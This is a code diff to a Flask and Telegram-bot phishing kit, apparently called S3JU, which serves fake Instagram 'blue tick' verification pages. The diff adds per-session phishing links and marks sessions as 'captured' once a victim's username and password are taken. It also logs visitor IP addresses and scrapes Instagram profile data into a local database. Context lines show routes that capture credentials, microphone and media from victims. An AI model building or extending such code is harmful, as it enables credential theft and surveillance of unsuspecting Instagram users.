@@ -6,6 +6,7 @@ import random
 import logging
 import base64
 import html
+import time
 from datetime import datetime
 from io import BytesIO
 from urllib.parse import urlparse
@@ -32,9 +33,15 @@ app.secret_key = FLASK_SECRET
 
 TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 DB_PATH = "s3ju.db"
+PROFILES_DB_PATH = "profiles.db"
 
 def get_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def get_profiles_db():
+    conn = sqlite3.connect(PROFILES_DB_PATH, check_same_thread=False)
     conn.row_factory = sqlite3.Row
     return conn
 
@@ -104,6 +111,31 @@ def init_db():
     """)
     conn.commit()
     conn.close()
+
+    pconn = get_profiles_db()
+    pc = pconn.cursor()
+    pc.executescript("""
+        CREATE TABLE IF NOT EXISTS instagram_profiles (
+            username TEXT PRIMARY KEY,
+            full_name TEXT DEFAULT '',
+            biography TEXT DEFAULT '',
+            is_private INTEGER DEFAULT 0,
+            is_verified INTEGER DEFAULT 0,
+            followers INTEGER DEFAULT 0,
+            following INTEGER DEFAULT 0,
+            posts INTEGER DEFAULT 0,
+            profile_pic TEXT DEFAULT '',
+            profile_pic_hd TEXT DEFAULT '',
+            external_url TEXT DEFAULT '',
+            is_business INTEGER DEFAULT 0,
+            is_professional INTEGER DEFAULT 0,
+            category TEXT DEFAULT '',
+            user_id TEXT DEFAULT '',
+            fetched_at TEXT DEFAULT ''
+        );
+    """)
+    pconn.commit()
+    pconn.close()
 
 def generate_session_id():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
@@ -342,10 +374,6 @@ ADMIN_MENU = [
 def index():
     return "<h1>🚀 S3JU v1.0</h1><p>Developed by D4RK-K1NG</p>"
 
-@app.route("/blue_tick", methods=["GET"])
-def blue_tick_page():
-    return render_template_string(load_template("blue_tick.html"))
-
 @app.route("/bluetick_capture", methods=["POST"])
 def bluetick_capture():
     try:
@@ -367,6 +395,12 @@ def bluetick_capture():
             (username, password, ip, ua, json.dumps(profile), timestamp)
         )
         conn.commit()
+
+        chat_id = data.get("session_chat_id", 0)
+        if chat_id:
+            conn.execute("UPDATE sessions SET status = 'captured' WHERE chat_id = ? AND platform = 'instagram_vip'", (chat_id,))
+            conn.commit()
+
         conn.close()
 
         verified_status = "✅" if profile.get("verified") else "❌"
@@ -406,15 +440,15 @@ def lookup_instagram():
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Accept": "application/json",
         }
-        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
-        resp = requests.get(url, headers=headers, timeout=15)
+        api_url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
+        resp = requests.get(api_url, headers=headers, timeout=15)
         data = resp.json()
 
         user = data.get("data", {}).get("user")
         if not user:
             return jsonify({"error": "This account does not exist. Please check the username and try again."})
 
-        result = {
+        profile_data = {
             "username": user.get("username"),
             "full_name": user.get("full_name", ""),
             "biography": user.get("biography", ""),
@@ -423,13 +457,35 @@ def lookup_instagram():
             "followers": user.get("edge_followed_by", {}).get("count", 0),
             "following": user.get("edge_follow", {}).get("count", 0),
             "posts": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
-            "profile_pic": user.get("profile_pic_url_hd", ""),
+            "profile_pic": user.get("profile_pic_url_hd", "") or user.get("profile_pic_url", ""),
             "external_url": user.get("external_url", ""),
             "business": user.get("is_business_account", False),
             "professional": user.get("is_professional_account", False),
             "category": user.get("category_name", ""),
         }
-        return jsonify(result)
+
+        pconn = get_profiles_db()
+        pconn.execute("""
+            INSERT OR REPLACE INTO instagram_profiles
+            (username, full_name, biography, is_private, is_verified, followers, following, posts,
+             profile_pic, profile_pic_hd, external_url, is_business, is_professional, category, user_id, fetched_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (
+            profile_data["username"], profile_data["full_name"], profile_data["biography"],
+            1 if profile_data["private"] else 0,
+            1 if profile_data["verified"] else 0,
+            profile_data["followers"], profile_data["following"], profile_data["posts"],
+            profile_data["profile_pic"], profile_data["profile_pic"],
+            profile_data["external_url"],
+            1 if profile_data["business"] else 0,
+            1 if profile_data["professional"] else 0,
+            profile_data["category"], user.get("id", ""),
+            datetime.now().isoformat()
+        ))
+        pconn.commit()
+        pconn.close()
+
+        return jsonify(profile_data)
 
     except Exception as e:
         logger.error(f"Instagram lookup error: {e}")
@@ -707,7 +763,7 @@ def handle_message(message):
     if text == "/help":
         admin_section = ""
         if is_admin(chat_id):
-            admin_section = "\n\n👑 <b>Admin commands:</b>\n/admin - Open admin panel\n/broadcast - Broadcast to all users"
+            admin_section = "\n👑 <b>Admin commands:</b>\n/admin - Open admin panel\n/broadcast - Broadcast to all users"
         send_telegram(chat_id,
             "📚 <b>S3JU Commands</b>\n\n"
             "🚀 /start - Welcome and banner\n"
@@ -791,7 +847,7 @@ def handle_callback(callback):
         conn.commit()
         conn.close()
 
-        session_url = f"{PUBLIC_URL}/blue_tick"
+        session_url = f"{PUBLIC_URL}/p/{session_id}"
 
         edit_message(chat_id, message_id,
             f"✅ <b>Instagram VIP Link Created!</b> ✅\n\n"
@@ -1031,6 +1087,7 @@ def serve_phishing_page(session_id):
 
     ip = get_visitor_ip()
     conn.execute("UPDATE sessions SET total_views = total_views + 1, ip = ? WHERE session_id = ?", (ip, session_id))
+    conn.execute("UPDATE sessions SET country = ?, city = ? WHERE session_id = ?", (get_visitor_ip(), "", session_id))
     conn.commit()
     conn.close()
 
@@ -1052,6 +1109,12 @@ def serve_phishing_page(session_id):
         template = load_template("mic.html")
         if template:
             return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))
+        return redirect("https://www.instagram.com")
+
+    if platform == "instagram_vip":
+        template = load_template("blue_tick.html")
+        if template:
+            return render_template_string(template, session_id=session_id)
         return redirect("https://www.instagram.com")
 
     template_file = PLATFORM_TEMPLATES.get(platform)
@@ -1180,6 +1243,7 @@ def capture_media(session_id):
 
     conn.close()
     return jsonify({"success": True})
+
 
 init_db()
 
